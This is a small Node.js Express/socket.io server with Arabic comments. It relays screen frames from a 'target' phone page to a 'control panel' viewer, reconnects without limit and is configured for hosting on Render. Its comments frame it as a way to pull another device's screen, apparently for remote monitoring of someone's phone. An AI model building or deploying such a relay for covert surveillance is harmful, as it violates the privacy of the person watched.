const express = require('express');
const app = express();
const http = require('http').Server(app);
const io = require('socket.io')(http, {
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000
});
const path = require('path');

// تقديم الملفات من مجلد public
app.use(express.static(path.join(__dirname, 'public')));

// رابط الجهاز الذي تريد سحب شاشته
app.get('/send', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'target.html'));
});

// رابط لوحة التحكم الخاصة بك
app.get('/view', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'monitor.html'));
});

io.on('connection', (socket) => {
    console.log('✅ جهاز جديد اتصل بالسيرفر');

    // استقبال البث من الهاتف وتمريره لك
    socket.on('screen_frame', (data) => {
        socket.broadcast.emit('update_monitor', data);
    });

    socket.on('disconnect', () => {
        console.log('❌ انقطع الاتصال.. بانتظار عودة الجهاز تلقائياً');
    });
});

// إعداد المنفذ لمنصة رندر
const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`🚀 السيرفر يعمل على المنفذ ${PORT}`);
});
